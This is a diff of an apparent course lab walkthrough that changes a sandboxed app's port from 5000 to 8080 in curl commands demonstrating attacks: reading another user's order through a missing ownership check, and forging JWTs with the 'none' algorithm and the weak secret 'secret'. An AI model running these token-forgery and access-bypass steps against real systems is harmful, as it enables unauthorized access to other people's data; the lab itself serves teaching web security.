@@ -1,11 +1,11 @@
 # Week 6 — Attack walkthrough (sandbox only)
 
-App runs on `http://localhost:5000`. Start it with `docker compose up`.
+App runs on `http://localhost:8080`. Start it with `docker compose up`.
 
 ## 0. Log in as alice (get a token)
 
 ```bash
-TOKEN=$(curl -s -X POST http://localhost:5000/login \
+TOKEN=$(curl -s -X POST http://localhost:8080/login \
   -H 'Content-Type: application/json' \
   -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
 echo "$TOKEN"
@@ -17,9 +17,9 @@ Alice's token reads bob's order #2 because there is no ownership check:
 
 ```bash
 # Alice's own order (id 1) — expected
-curl -s http://localhost:5000/api/orders/1 -H "Authorization: Bearer $TOKEN"
+curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
 # Bob's order (id 2) — should be forbidden, but the vulnerable app returns it
-curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $TOKEN"
+curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
 ```
 
 In `solution_app.py` the second call returns `403 forbidden`.
@@ -35,7 +35,7 @@ import jwt
 print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
 PY
 )
-curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED"
+curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
 ```
 
 ## 3. Forged token — weak HMAC secret "secret" (CWE-321)
@@ -48,7 +48,7 @@ import jwt
 print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
 PY
 )
-curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED2"
+curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
 ```
 
 Against `solution_app.py` both forged tokens fail: `none` is rejected (algorithm pinned to
